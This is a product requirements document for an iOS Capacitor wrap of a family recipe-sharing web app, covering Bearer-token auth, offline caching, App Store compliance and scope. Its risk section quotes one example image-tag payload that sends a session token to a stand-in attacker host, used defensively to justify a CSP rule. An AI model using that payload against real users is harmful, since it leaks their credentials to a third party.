---
stepsCompleted: ["step-01-init", "step-02-discovery", "step-02b-vision", "step-02c-executive-summary", "step-03-success", "step-04-journeys", "step-05-domain-skipped", "step-06-innovation-skipped", "step-07-project-type", "step-08-scoping", "step-09-functional", "step-10-nonfunctional", "step-11-polish", "step-12-complete"]
status: complete
completedAt: "2026-05-10"
inputDocuments:
  - "_bmad-output/planning-artifacts/research/technical-simmer-mobile-app-decisions-research-2026-05-09.md"
  - "_bmad-output/planning-artifacts/product-brief-Simmer.md"
  - "_bmad-output/planning-artifacts/prd.md"
  - "docs/architecture.md"
  - "docs/data-models.md"
  - "docs/api-contracts.md"
  - "docs/project-overview.md"
  - "docs/source-tree-analysis.md"
  - "docs/component-inventory.md"
  - "docs/development-guide.md"
documentCounts:
  briefs: 1
  research: 1
  brainstorming: 0
  projectDocs: 7
  projectContext: 0
  existingPRD: 1
workflowType: 'prd'
scope: 'mobile-app'
classification:
  projectType: mobile_app
  domain: general
  complexity: medium
  projectContext: brownfield
flaggedRisks:
  - "Combined test surface (dual cookie + Bearer auth, WKWebView, offline cache) has no integration safety net — surface in NFRs (step 10)"
  - "App Store review gate (Apple guideline 4.2) requires native polish (splash, status bar, haptics) — surface in scope/risk (step 8)"
---

# Product Requirements Document - Simmer Mobile App

**Author:** Jamesfrauen
**Date:** 2026-05-10

## Executive Summary

Simmer Mobile is a Capacitor-packaged native shell over the existing Simmer Next.js web app, shipping iOS and Android binaries that inherit the full shipped feature set — recipe vault, partner-shared vaults, friend connections, activity feed, AI URL extraction, cook tracking — without rewriting product logic. The mobile app exists to make Simmer a home-screen presence in the families it's built for: an icon next to Messages and Instagram that opens to a recipe library their partner co-owns and a feed of what their sister just cooked.

The web app is already mobile-aware — bottom-tab navigation at the `sm:` breakpoint, Screen Wake Lock for cook mode, mobile-first layout — and the social pivot (partner vault, activity feed with cook/add/save events) has already shipped. The mobile project is therefore a **packaging shift, not a rewrite**: Capacitor wraps the existing codebase, a Bearer-token auth path (the existing `Session.token` UUID sent in an `Authorization: Bearer <token>` header — not OAuth, not JWT) is added to the existing `Session` table (~10 lines), and a read-only offline cache via TanStack Query persistence preserves recipes at the stove when wifi falters. Push notifications, async recipe extraction, and offline writes are explicitly deferred to v2.

v1 audience is the founder's family — the same cohort that has been validating the web app — onboarded via TestFlight and Android internal testing. v1 success is whether those family members open the app on their phones with the same cadence they currently open Instagram in the same kitchen moments.

### What Makes This Special

- **Home-screen presence, not a tab.** Simmer becomes one of the apps your family already opens daily — same muscle memory as Instagram or Messages — rather than a URL someone has to remember to visit.
- **Kitchen-context as a first-class surface.** The phone is the kitchen device. Cook mode + wake lock + offline-readable recipes turn "I'm at the stove, the chicken is hot" into a supported flow, not a degraded one.
- **App Store as legitimacy.** "Search Simmer in the App Store" lowers the social cost of inviting your mom in a way that "type this URL" never could.
- **Push-ready architecture.** v1 keeps 30s polling to ship fast, but the data model and feed pipeline are ready for a push dispatcher in v2 — at which point "your sister just cooked Mom's pasta" becomes the social-loop accelerator that web fundamentally cannot deliver.
- **Engineering feasibility for a solo developer.** Capacitor inherits the mobile-aware web codebase for free; the alternative (React Native / Expo) would have been a 6–10 week rewrite that locked out the web side. The mobile app exists because this packaging path exists.

## Project Classification

- **Project Type:** Mobile app — Capacitor-wrapped Next.js codebase; v1 ships as an iOS-only native binary via TestFlight (Android and public App Store release deferred to v2)
- **Domain:** Consumer / lifestyle — private family-scoped recipe vault with social activity feed; no regulated-industry concerns
- **Complexity:** Medium — combined test surface (dual cookie + Bearer auth, WKWebView, offline cache) has no integration safety net; App Store review (Apple guideline 4.2) is a binary gate requiring native polish (splash, status bar styling, haptic feedback)
- **Project Context:** Brownfield — sits on an existing Next.js + Postgres + Gemini stack with stable schema (last migration 2026-04-01) and a shipped social layer; mobile adds a packaging path and a Bearer-token auth surface but introduces no new product entities

## Success Criteria

### User Success

- **Install activation:** 80%+ of invited family members install the app within 7 days of receiving the TestFlight / Play internal-testing link.
- **Mobile-vs-web shift:** Within 4 weeks of install, 60%+ of a user's recipe activity (cook logs, saves, recipe adds, library opens) originates from mobile rather than web.
- **Home-screen retention:** Installed family members open the app 4+ times per week — at least one more weekly open than the web baseline, indicating the app earned its home-screen slot.
- **Kitchen-mode adoption:** 70%+ of cook logs from mobile have cook mode (wake lock) engaged, indicating the app is being used at the stove.
- **"Aha" moment delivered:** Within first session, a user opens the app on their phone, sees a partner-added or friend-cooked recipe in their library / feed, opens it, and either saves it or marks it cooked — all from mobile.

### Business Success

- **App distribution:** v1 ships to TestFlight (iOS) within 6 weeks of mobile project start. Android platform support and public App Store release both deferred to v2.
- **Founder family migration:** 100% of the founder's family who use web Simmer (current active cohort) are installed and opening mobile weekly within 6 weeks of TestFlight invite.
- **Zero web regressions:** The Bearer-token auth path is added without breaking any existing web flow. Measured by zero auth-related bug reports from existing web users in the 2 weeks following Bearer rollout.
- **v2 push-readiness:** When v2 push work begins, the data model and feed pipeline require zero schema migrations to support push dispatch — only additive endpoint and dispatcher work.

### Technical Success

- **Crash-free sessions:** ≥ 99.5% (industry baseline for Capacitor apps).
- **Cold start time:** App opens to library in ≤ 2.5 seconds on a 3-year-old iPhone over wifi.
- **Offline cache effectiveness:** After a user has viewed a recipe once online, that recipe's detail view loads from cache in ≤ 500 ms with airplane mode on. Cache covers user's library + partner's recipes + saved recipes + last 50 feed events.
- **Dual-auth coverage:** All 16 existing API endpoints accept both cookie and Bearer-token auth, verified by a manual regression checklist run twice (cookie path, Bearer path) before TestFlight ship — the explicit mitigation for the "no integration test net" risk flagged in classification.
- **TestFlight readiness:** First TestFlight build passes Apple's beta review on first or second submission. Native polish present: custom splash, status bar styling, app icon, haptic feedback on cook log / save / unlink-partner.
- **Binary size:** iOS .ipa ≤ 30 MB (Capacitor base + assets, no large media bundled).

### Measurable Outcomes

| Metric | Target | Timeframe |
|---|---|---|
| Founder family installs | 100% of invited | Within 7 days of invite |
| Weekly app opens per installed user | 4+ | Ongoing from week 2 |
| Cook logs originating from mobile | 60%+ | Within 4 weeks of install |
| Cook mode (wake lock) engaged on cook log | 70%+ | Ongoing |
| Web auth regressions post-Bearer rollout | 0 | First 2 weeks |
| Crash-free session rate | ≥ 99.5% | Ongoing |
| Recipe detail offline-load (after first view) | ≤ 500 ms | Ongoing |
| TestFlight beta approval | First or second submission | At TestFlight ship |
| Cold start (3-year-old iPhone, wifi) | ≤ 2.5 s | Ongoing |

## Product Scope

### MVP — v1 (Mobile)

- **Capacitor wrap of existing Next.js codebase** for iOS, built via Capacitor CLI + Xcode, distributed via TestFlight.
- **Bearer-token auth path** added to `src/lib/auth.ts` (~10 LOC change); login/signup endpoints return `Session.token` in response body; mobile persists in iOS Keychain via Capacitor Secure Storage.
- **Read-only offline cache** of user's library, partner's recipes, saved recipes, and last 50 feed events via `@tanstack/query-async-storage-persister`; "you're offline — showing cached recipes" banner when network is down; all write actions disabled with friendly message.
- **Native polish:** custom splash screen, native app icon, status bar styling, haptic feedback on cook log / save / cook-mode toggle, edge-to-edge layout.
- **All shipped web features inherited:** recipe vault, partner vault, friend connections, activity feed (with 30s polling), AI URL extraction, cook tracking with ratings, "want to try" list, search/filter, tags.
- **Distribution:** TestFlight only — not public App Store yet. Android platform support deferred to v2.
- **Backend changes:** only the Bearer-token auth path; confirm Vercel Pro + Fluid Compute with `maxDuration: 60` on `/api/recipes/summarize`.

### Growth Features (Post-MVP) — v2

- **Android platform support** — Capacitor Android build wrapping the same Next.js codebase; distributed via Google Play Internal Testing, then public Google Play. Gated on Google Play developer account ($25 one-time).
- **Push notifications** (APNs for iOS + FCM for Android via Capacitor Firebase Push); triggers on friend cook events; backend dispatcher reads `FeedEvent` writes; permission prompt deferred to first feed view, not first launch.
- **Async recipe extraction** via Inngest: `POST /api/recipes/summarize` returns `{ jobId }` immediately; background job runs Gemini extraction; mobile polls every 1s for ~30s, then falls back to push notification "Your recipe is ready".
- **iOS Share Extension** ("Share to Simmer" from Safari, Messages, etc.) — paste a URL from anywhere.
- **Public iOS App Store release** — gated on Apple Developer enrollment ($99/yr).
- **Optimistic cook-log writes with retry queue** — log cooks while offline, replay on reconnect.
- **Active sessions list + remote revoke** (web settings page) — view all active sessions across devices and revoke any single token; addresses lost-phone / device-replacement scenarios.

### Vision (Future) — v3+

- **Camera-based recipe scan** — OCR of cookbook pages, handwritten family recipes.
- **AirPlay / Chromecast support** — display cook mode on a TV.
- **Voice-controlled cook mode** — "next step," "set 8 minute timer".
- **Full offline-first sync** — WatermelonDB or equivalent with `pullChanges`/`pushChanges` endpoints (only if user feedback demands it; the research recommends *not* defaulting here).
- **Native screen polish** — port hot screens (feed list, cook mode) to React Native via `react-native-web` patterns if Capacitor WebView performance becomes the bottleneck.

## User Journeys

### Journey 1: Migrating from Web to Mobile

**Persona:** Jamie (founder), uses Simmer web daily. Six weeks since the social pivot shipped. Has 60 recipes, a partner vault with Alex, and 3 connected friends.

**Opening Scene:** Jamie's deep into web Simmer — every Sunday opens it for the "what should we cook?" browse, but it's never the *first* app opened in the kitchen. Instagram, Messages, and a browser tab all compete. The mobile app shows up in TestFlight: "Simmer — install now."

**Rising Action:** Jamie taps the TestFlight link from their phone. TestFlight installs Simmer; tapping the icon launches a custom splash, then login. They sign in with the same email/password — the Bearer-token path silently exchanges credentials for a stored session token in iOS Keychain. The library loads. Their 60 recipes are there, Alex's recipes are merged, last-cooked recipe is at the top.

**Climax:** Jamie opens the app Tuesday from the home screen — no URL typing, no tab switching — and pulls up a recipe while the chicken thaws. The app is now competing in the same launcher slot as Instagram, and winning that competition for kitchen-context moments.

**Resolution:** Within two weeks, Jamie has stopped opening Simmer in a browser entirely. Mobile is the way they use it. The web becomes the laptop-screen "add a long Instagram recipe" surface; mobile is the kitchen surface.

**Capabilities revealed:** Bearer-token login persistence, splash screen, app icon, library cold-start with partner-vault merge, secure token storage, recently-cooked sort on cold start.

---

### Journey 2: New Family Member Invited via TestFlight

**Persona:** Sarah, Jamie's sister, late 20s. Previously skeptical of "another web app." Now Jamie sends a TestFlight invite link.

**Opening Scene:** Sarah's previous skepticism was rational — yet another web app she'd have to bookmark and remember to visit. The TestFlight invite is different: it's an *app*, with an *icon*, in her *app drawer*. She taps install out of curiosity.

**Rising Action:** TestFlight installs Simmer. First launch: a brief onboarding modal explains the family-cookbook concept (the existing web `OnboardingModal` rendered on mobile). She signs up — email, name, password. The signup endpoint returns a token; the app stores it in iOS Keychain. She's prompted to add a friend; she searches Jamie's email, sends a request. Jamie accepts within the same hour.

**Climax:** Sarah opens the feed. Jamie's last cook event appears: "Thai basil chicken, 9/10, last night." She taps through, reads the recipe, saves to want-to-try with a single haptic-confirmed tap. The save action also creates a feed event that Jamie sees.

**Resolution:** Sarah checks the app 3-4 times the first week. She adds 4 recipes of her own via URL paste, with the AI extraction completing in ~12 seconds each (with a "Summarizing your recipe" spinner she finds reassuring). The app earned its place on her home screen because the install friction was *App Store, tap, open* — not *type URL, sign up in a browser, remember to come back*.

**Capabilities revealed:** TestFlight onboarding flow, first-launch welcome modal, mobile signup endpoint returning token, secure token storage, friend search/request via mobile, feed display, save-from-feed with haptic feedback, URL paste extraction with mobile-friendly loading state.

---

### Journey 3: Cook Mode in a Patchy-Wifi Kitchen

**Persona:** Linda (Jamie's mom), 60s. Cooks regularly. Joined Simmer because her kids asked. Has saved a few of Jamie's recipes plus 3 native recipes of her own.

**Opening Scene:** Linda's cooking dinner. Her kitchen has weak wifi — the router's in the living room. She opens Simmer to pull up the Thai basil chicken recipe she saved from Jamie last week. The app launches; the connection status is "offline."

**Rising Action:** The library loads from the offline cache — every recipe she's viewed is there. A subtle banner reads "You're offline — showing cached recipes." She finds the chicken recipe and taps it. The detail view renders in under half a second from cache: ingredients, steps, image. She enables cook mode; the screen wake lock kicks in, the status bar dims, the steps display in a larger format.

**Climax:** She cooks the whole recipe with the screen alive the entire time, hands sticky with garlic, never having to wake the phone. When she finishes and walks back into the living room, the network reconnects. The "you're offline" banner disappears.

**Resolution:** Linda tries to mark the recipe as cooked. The app prompts: "Connect to save your cook log." She moves to the kitchen doorway, gets signal, taps cook with an 8/10 rating. Jamie sees Mom's cook in the feed within 30 seconds. Linda doesn't think about the offline behavior — it just worked when she needed it. (v2 will allow logging the cook offline; for v1, she had to wait until reconnected.)

**Capabilities revealed:** Offline cache for recipes already viewed, offline detection + UI banner, cook mode with wake lock on mobile, write actions disabled offline with clear messaging, cook log POST on reconnect.

---

### Journey 4: Push-Notification Recipient (v2 — design context)

**Persona:** Alex (Jamie's partner), early 30s. Doesn't browse the feed proactively. Opens Simmer maybe twice a week when Jamie asks "what should we cook?"

**Opening Scene:** It's Wednesday at 7:30pm. Alex is on the couch on their phone. A push notification arrives: *"Jamie just cooked Thai basil chicken — 9/10."*

**Rising Action:** Alex taps the notification. The app launches deep-linked to the recipe detail. The Bearer-token session is still valid; no re-login. Alex reads the recipe, sees it's a weeknight-tagged 25-minute dish, taps save to want-to-try. Haptic feedback confirms.

**Climax:** Sunday rolls around, Jamie asks "what are we making this week?" Alex pulls up Simmer; the saved recipe is at the top of want-to-try. They cook it Tuesday. Recipe discovery happened via push; decision happened via the shared library; cooking became the new feed event for the cycle.

**Resolution:** Push notifications become the discovery channel Alex actually uses. They don't open the app to browse the feed — they open it when a notification tells them something interesting happened. The feed is consumed *as push-arrivals*, not as a scrollable destination.

**Capabilities revealed (v2):** Push notification permission flow (deferred to first feed view, not first launch), FCM/APNs payload format with recipe ID, deep-linking from notification to recipe detail, persisted Bearer session valid across app launches. Backend: a push dispatcher subscribing to `FeedEvent` writes, fanning out to friends' devices.

---

### Journey Requirements Summary

| Capability | Journeys | Phase |
|---|---|---|
| TestFlight install + first launch | 1, 2 | v1 |
| Bearer-token auth + secure storage (iOS Keychain) | 1, 2, 4 | v1 |
| Custom splash + app icon | 1, 2 | v1 |
| First-launch onboarding modal (existing web `OnboardingModal`) | 2 | v1 |
| Email/password signup returning session token | 2 | v1 |
| Library cold-start with partner-vault merge | 1 | v1 |
| Friend search + request via mobile | 2 | v1 |
| Feed display with 30s polling | 2 | v1 |
| Recipe detail view from offline cache | 3 | v1 |
| Offline detection + banner | 3 | v1 |
| Offline-disabled writes with messaging | 3 | v1 |
| Cook mode + screen wake lock on mobile | 3 | v1 |
| Save-from-feed with haptic feedback | 2, 4 | v1 |
| URL paste → AI extraction (sync, mobile spinner) | 2 | v1 |
| Cook log + rating on reconnect | 3 | v1 |
| Push notifications with deep-link to recipe | 4 | **v2** |
| Push permission prompt deferred to first feed view | 4 | **v2** |

## Mobile App Specific Requirements

### Project-Type Overview

Simmer Mobile v1 is a **Capacitor 7.x iOS wrap** of the existing Next.js 16 web application, distributed as a native iOS binary via TestFlight to the founder's family. The Next.js codebase is the primary engineering surface; Capacitor provides the iOS native shell and a JavaScript bridge for device APIs (secure storage, network state, haptics, status bar, splash). No platform-specific code is written by hand for v1 — all native functionality is consumed via Capacitor plugins. **Android support is explicitly deferred to v2.**

### Technical Architecture Considerations

**Build & rendering:**
- **Capacitor 7.x** as the iOS native shell, wrapping the Next.js app served from the Vercel production domain via `server.url` config
- **iOS**: WKWebView renders the app; native binary built via Xcode 16+; supports iOS 16+
- **Build pipeline v1**: Capacitor CLI locally + Xcode for archiving
- **Single codebase**: the Next.js app at `simmer.vercel.app` is the source of truth; Capacitor wraps the deployed URL

**Distribution:**
- **v1**: TestFlight only. Family-only audience. Builds via personal Apple ID work for 7-day developer testing; Apple Developer enrollment required for builds with longer expiry.
- **v2**: Android (Play Internal Testing → public Play) + public iOS App Store release + push notifications. Gated on Apple Developer enrollment ($99/yr) and Google Play developer account ($25 one-time).

### Platform Requirements (v1)

| Concern | iOS v1 |
|---|---|
| Minimum OS | iOS 16+ (aligns with Capacitor 7 baseline) |
| WebView | WKWebView (system) |
| Binary format | `.ipa` |
| Build tool | Xcode 16+ |
| Distribution | TestFlight |
| Developer account cost (v1) | Free with Apple ID (7-day builds) — sufficient for family testing; $99/yr Developer Program needed for longer-lived TestFlight builds |

**Why iOS-only for v1:** the founder's family is iPhone-based. Skipping Android halves the test surface, removes the Google Play developer fee and Play Console setup, and lets the App Store gate be the single store-review concern. Android comes online in v2 as a near-mechanical port (same Capacitor codebase, different build target).

### Device Permissions & Native Capabilities (v1)

All v1 native capabilities are accessed via Capacitor plugins — no hand-written native code.

| Capability | Plugin | Permission prompt | Phase |
|---|---|---|---|
| Bearer-token persistence | `@capacitor-community/secure-storage` (iOS Keychain) | No | v1 |
| Offline detection | `@capacitor/network` | No | v1 |
| Haptic feedback (cook log save, save-from-feed, partner unlink) | `@capacitor/haptics` | No | v1 |
| Screen wake lock (cook mode) | Web Screen Wake Lock API (existing `useWakeLock` hook works in WKWebView) | No | v1 |
| Status bar styling | `@capacitor/status-bar` | No | v1 |
| Splash screen | `@capacitor/splash-screen` | No | v1 |
| Android port of all of the above | (same plugins, Android targets) | No | **v2** |
| Push notifications | `@capacitor-firebase/messaging` (APNs + FCM) | Yes — deferred to first feed view | **v2** |
| iOS Share Extension ("Share to Simmer") | Custom native | No | **v2** |
| Camera (recipe scan) | `@capacitor/camera` | Yes | **v3+** |
| Microphone (voice cook mode) | `@capacitor/microphone` | Yes | **v3+** |

**Notable:** the existing web `useWakeLock` hook ([src/hooks/use-wake-lock.ts](src/hooks/use-wake-lock.ts)) works unchanged in WKWebView. If real-device testing reveals reliability issues, fall back to a native iOS `UIApplication.idleTimerDisabled` plugin — but ship the web API first.

### Offline Mode (v1, iOS)

**Strategy:** Read-only cached library + feed via `@tanstack/query-async-storage-persister`. No offline writes. No background sync.

- **Scope**: user's own library, partner's recipes, saved recipes ("want to try"), last 50 feed events, and any recipe-detail page previously viewed online.
- **Storage backend**: `@capacitor/preferences` (backed by NSUserDefaults on iOS) for serialized TanStack Query state. Recipe images use WKWebView's native HTTP cache, not application-managed cache.
- **Cache freshness**: TanStack Query `staleTime` set to 5 minutes for library and feed queries (refetch on next online open); recipe details cached `Infinity` and only refetched on explicit pull-to-refresh.
- **Cache size budget**: ~5 MB for 200 recipes including JSON ingredient/step arrays and small image URLs.
- **Offline detection**: `@capacitor/network` emits `networkStatusChange`; the app shows a persistent "You're offline — showing cached recipes" banner at the top of the layout.
- **Write actions when offline**: disabled with a "Connect to save" inline message. No queueing in v1. The user must reconnect to log a cook, save a recipe, or send a friend request.
- **First-launch offline**: degrades gracefully — login attempt fails with "Connect to sign in." Once signed in once online, subsequent offline launches show the cached library.

**v2 enhancement**: optimistic-writes retry queue for **cook logs only** (per technical research). All other writes remain online-only.

### Push Strategy

**v1: Polling, unchanged.** The existing `useFeedPolling` hook runs 30-second polls of `/api/feed?since=<ISO>` in the WKWebView.

**v2: Capacitor Firebase Push** (APNs for iOS + FCM for Android, deployed together with Android platform support).

- **Provider choice**: `@capacitor-firebase/messaging` chosen over OneSignal for tighter Capacitor integration. OneSignal is an alternative if dashboard/analytics features become valuable.
- **Permission UX**: prompt deferred to first feed view, not first launch.
- **Server-side dispatcher**: new `sendPush(userId, payload)` helper in `src/lib/push.ts`. Subscribes to `FeedEvent` writes; for each event, looks up the originating user's friends via `getFriendIds()`, then fans out to each friend's device tokens.
- **Device token storage**: new `DeviceToken` table — `{ userId, platform: "ios" | "android", token, createdAt }`.
- **Payload format**: `{ title, body, recipeId, eventType }`. Tapping the notification deep-links to `/recipes/[recipeId]`.
- **Event types pushed**: `cook` and `cook_favorite` only. `add_recipe` and `save_recipe` excluded to avoid notification fatigue.
- **Apple Developer enrollment ($99/yr) required for APNs cert; FCM free.**

### Store Compliance (iOS v1)

**The primary risk is Apple App Store Review Guideline 4.2** ("Minimum Functionality" — apps that "look like a website" get rejected). Mitigations baked into v1 scope:

- Custom splash screen (`@capacitor/splash-screen` with brand-matched launch storyboard)
- Native app icon (all required iOS sizes)
- Status bar styling matching the app theme
- Haptic feedback on key actions (cook log, save, partner unlink)
- Edge-to-edge layout with respect for safe areas
- No visible browser UI

**App Privacy declarations (iOS):**
- **Data collected**: email (account + friend search), name (display), recipe content (user-generated), cook logs and ratings (user activity), partner/friend relationships (social graph)
- **Linked to user identity**: yes — all data is account-scoped
- **Used for tracking**: no — no advertising or third-party analytics
- **Third-party sharing**: none — Gemini API calls are server-side proxied
- Privacy policy URL: required; reuse the web privacy policy

**Other:**
- **Encryption export compliance**: default declaration (`ITSAppUsesNonExemptEncryption: NO`) — standard HTTPS, no novel cryptography, eligible for exemption.
- **Capacitor security hardening**: `server.url` pinned to the Vercel production domain; `allowNavigation` restricts WKWebView navigation to first-party + recipe-source domains.
- **Launch screen**: native LaunchScreen.storyboard before WKWebView mounts to avoid a white flash.

**Google Play / Data Safety declarations**: deferred to v2.

### Implementation Considerations

**Code reuse strategy:**
- **Reuse 100%** of Next.js app routes, components, and server-side logic. The Capacitor wrap consumes the deployed web app verbatim.
- **Add mobile-only files** for Capacitor plugin integrations: a small `src/lib/native.ts` module that detects Capacitor runtime (`Capacitor.isNativePlatform()`) and wires platform-specific calls (secure storage, haptics, status bar) behind a single interface. Web code calls into this module and gets no-ops on web.
- **Auth modification**: `src/lib/auth.ts` `getCurrentUser()` extended to read `Authorization: Bearer <token>` header as a fallback when no cookie is present. ~10 LOC. Same `Session` table, same UUIDs — purely additive.
- **Login/signup endpoints**: return `{ user, token }` in the response body alongside setting the cookie. Mobile reads the token; web ignores it.

**The "one codebase, two clients" boundary:**
- `Capacitor.isNativePlatform()` is the single runtime check. Web code paths never see Capacitor APIs; mobile code paths fall back to web APIs on non-native runtimes.
- No conditional UI rendering for v1. The mobile-aware web UI (bottom tab nav, mobile-first layout) is the iOS UI.

No desktop or CLI surface is in scope for this PRD.

## Project Scoping & Phased Development

### MVP Strategy & Philosophy

**MVP Approach:** **Platform MVP** — ship the minimum native shell that gives the existing functional web app a home-screen presence, secure-storage auth, and offline read cache. Validate that family members actually open the app on their phones with the cadence the success criteria target. Validation, not feature breadth, is the v1 goal.

**Resource Requirements:** Solo developer, ~6 weeks of elapsed calendar time (engineering + TestFlight submission + App Store review prep). Existing Next.js + Postgres + Gemini stack reused unchanged except for the Bearer-token auth path (~10 LOC).

**Why these boundaries:** Capacitor is the only mobile path the technical research left feasible for a solo dev. Within Capacitor, v1 is iOS-only (founder family is iPhone-based; halves test surface), push-free (polling already works, push is a meaningful v2 hill), and offline-read-only (kitchen-context wifi is the killer use case for reads; writes are post-meal anyway). **Offline cache chosen over push for v1** because push requires 2–3 weeks of work (APNs cert + server dispatcher + permission flow); offline cache is ~½ day. v1 prioritizes shipping schedule over real-time UX. **Android port is budgeted as ~1 week of polish work in v2** — not "free" despite the shared Capacitor codebase; honest accounting matters for v2 estimation.

### MVP Feature Set (Phase 1)

**Core User Journeys Supported:**
- Journey 1 (Migrating from Web) — full support
- Journey 2 (New Family Member via TestFlight) — full support
- Journey 3 (Kitchen Cook with Patchy Wifi) — full support
- Journey 4 (Push Notification Recipient) — **explicitly deferred to v2** by design

**Must-Have Capabilities (mobile-specific, on top of all inherited web features):**

| Capability | Rationale |
|---|---|
| Capacitor 7.x iOS wrap of the deployed Next.js app | Without this, there is no mobile app |
| Bearer-token auth path on existing `Session` table (~10 LOC backend change) | WebView cookie behavior is platform-quirky; Bearer is the durable answer and unlocks future RN / API clients |
| Capacitor Secure Storage for Bearer token (iOS Keychain) | Only acceptable storage class for an auth credential on iOS |
| Read-only offline cache: user library, partner vault, saved recipes, last 50 feed events, viewed recipe details | Kitchen-context offline read is the killer use case mobile must win |
| App-resume cache invalidation (Capacitor App `appStateChange` listener → `queryClient.invalidateQueries`) + "Updated Nm ago" timestamp on recipe detail views | Closes the silent-staleness gap when user reopens the app after hours offline |
| Offline detection + persistent "you're offline" banner | Without it, the failure mode is silent staleness, which loses user trust |
| Cook mode + Screen Wake Lock (existing web hook works in WKWebView) | At-the-stove journey is the headline mobile win; wake lock is non-negotiable |
| Custom splash + native app icon (all iOS sizes) | App Store Review Guideline 4.2 mitigation — first impression must be native, not web |
| Status bar styling matching app theme | Same: removes the "looks like a website" signal |
| Haptic feedback on cook log, save-from-feed, partner unlink | Native "feel" review criterion |
| Edge-to-edge layout respecting iOS safe areas | Same: completes the native-feel checklist |
| TestFlight beta distribution channel | The only v1 ship target |
| All shipped web features inherited unchanged | Recipe vault, partner vault, friends, feed, AI URL extraction, cook tracking with ratings, "want to try," search/filter, tags — the entire web product surface |

**Explicitly NOT in MVP** (discipline matters):

- Android platform (Capacitor Android build, Google Play account, Play Internal Testing) → v2
- Push notifications (APNs + FCM, dispatcher, device token table, permission flow) → v2
- Async recipe extraction (Inngest job, status polling) → v2
- Offline writes / cook-log retry queue → v2
- iOS Share Extension ("Share to Simmer" from Safari) → v2
- Public App Store release (Apple Developer enrollment) → v2
- Active sessions list + remote revoke → v2
- Camera, voice control, AirPlay → v3+
- Recipe recommendations from social graph signals → v3+
- Full offline-first sync (WatermelonDB) → v3+ if ever
- Native screen ports (React Native via `react-native-web` for hot screens) → v3+ if Capacitor WebView perf becomes the bottleneck

### Post-MVP Features

See [Product Scope — Growth Features (Post-MVP) — v2](#growth-features-post-mvp--v2) and [Vision (Future) — v3+](#vision-future--v3) above for the full lists. v2 is anchored on three things that reinforce each other: Android (doubles addressable family device base), push notifications (the social-loop accelerator), and the public App Store release (legitimacy for non-family invitees).

### Risk Mitigation Strategy

**Technical Risks:**

- **Bearer-token regression on existing web auth.** The auth change touches every API route. Mitigation: a manual regression checklist run twice — once with cookie path, once with Bearer path — across all 16 endpoints before TestFlight ship. This is the explicit mitigation for the "no integration test net" risk flagged in classification. Land the dual-auth backend change in a single small PR with cookie path verified before mobile is enabled; a regression caught in production is caught fast because the founder is the canary. **Auth golden-path smoke test:** a defined 5-endpoint × 2-path checklist (login, list recipes, view recipe, log cook, view feed — each tested with cookie path and header path) run on production immediately after the dual-auth deploy. Mobile enablement is gated on this passing.
- **Capacitor WKWebView quirks** (cookie behavior, wake lock reliability, secure storage edge cases, status bar interactions with the WebView). Mitigation: real-device testing on the founder's iPhone before TestFlight invites go out; document any deltas from web behavior in a "mobile parity" note alongside the regression checklist.
- **Offline cache staleness causing user confusion.** Mitigation: persistent "showing cached recipes" banner during offline state; 5-minute TanStack Query `staleTime` forces refresh on next online session; cache is read-only so no data loss possible — worst case is stale read with a clear visual indicator. App-resume cache invalidation closes the "user reopens app after hours" gap.
- **WebView image cache exhaustion** for users with hundreds of recipes. Mitigation: not a real concern at family scale (< 500 recipes per user). Defer to v2 if it ever surfaces.
- **Token leak / cache leak hardening.** Three mitigations baked into v1: (a) **CSP `img-src`** restriction on recipe detail pages limiting outbound image loads to a CDN allowlist plus the recipe's source domain (defends against `<img src="https://attacker.com/?token=...">` exfiltration via extracted recipe content); (b) **server-side sanitization** of extracted recipe content (strip event handlers, inline scripts) before storing in Postgres; (c) **`queryClient.clear()` on logout** plus targeted `invalidateQueries` on partner unlink, friend removal, and friend-request decline — keeps the offline cache aligned with access-control changes (no stale `personalNotes` accessible after an unlink).

**Market / Store Risks:**

- **Apple App Store Review Guideline 4.2 rejection ("looks like a website").** **The primary v1 risk.** Mitigation: bake native polish into v1 scope (splash, icon, status bar styling, haptic feedback, edge-to-edge layout). Submit to TestFlight beta review first — beta review is more permissive than App Store review. Public App Store submission deferred to v2; v1's TestFlight-only distribution sidesteps the strict review entirely. Even with these mitigations, budget ~1 week for a possible review iteration cycle on the eventual public submission.
- **Family doesn't install the iOS app.** Leading indicator: 80%+ install rate within 7 days of TestFlight invite (success metric). Mitigation: founder personally walks each family member through the TestFlight install process if needed; the cohort is small (4–6 people) and known-friendly.
- **Apple Developer enrollment delay.** Apple Developer Program enrollment can take days to weeks (identity verification, especially for non-organization accounts). Mitigation: not strictly required for 7-day-expiry TestFlight builds via a personal Apple ID; enroll early so longer-lived builds become available before family fatigue with re-installing 7-day builds.

**Resource Risks:**

- **Solo-developer side-quest pacing.** Mitigation: scope is intentionally tight. If time-constrained, the **scope-cut order** is:
  1. Drop haptic feedback (low cost, App Store risk increases but recoverable)
  2. Drop status-bar dimming on cook mode (cosmetic)
  3. Drop edge-to-edge layout polish (cosmetic but App Store risk)
  4. **Do not drop offline cache** — it's the killer feature
  5. **Do not drop Bearer auth** — without it the app can't authenticate reliably
  6. **Do not drop splash + icon** — App Store will reject without them
- **Cross-cutting auth work.** The auth change touches every API endpoint indirectly via `getCurrentUser()`. Mitigation: write the dual-path code as a single small commit, ship to web first with cookie path verified, only then point the mobile client at it. Roll back is a one-commit revert.

## Functional Requirements

### Inherited Web App Capabilities (Mobile-Wrapped)

The mobile app preserves and supports all 39 functional capabilities defined in the web PRD's Functional Requirements section (FR1–FR39 of [prd.md](./prd.md)). These are referenced here by capability area; the web PRD remains the source of truth for their definitions.

- **FR1:** Mobile users can perform all **recipe management** capabilities defined in web FR1–FR10 (create linked or native recipes, edit, delete, add personal notes, tag with all six tag categories, browse, full-text search, filter with AND-across-categories / OR-within-category logic, sort).
- **FR2:** Mobile users can perform all **go-to signal** capabilities defined in web FR11–FR15 (numeric rating, mark cooked, favorite/pin, "want to try" list, signals visible on cards and detail views).
- **FR3:** Mobile users can perform all **AI recipe extraction** capabilities defined in web FR16–FR20 (paste URL, review/edit AI fields, manual paste fallback, regenerate summary, automatic image extraction from source).
- **FR4:** Mobile users can perform all **partner vault** capabilities defined in web FR21–FR25 (send partner invite, accept/decline, co-own a shared collection, merge recipes on link, unlink).
- **FR5:** Mobile users can perform all **friend connection** capabilities defined in web FR26–FR30 (search by email, send friend request, accept/decline incoming, view friends, remove friend).
- **FR6:** Mobile users can perform all **activity feed** capabilities defined in web FR31–FR37 (view chronological feed of mutual friends' activity, see cook/cook_favorite/cook_discard/add_recipe/save_recipe events, tap to view recipe, near-real-time updates via polling, save-from-feed to "want to try").
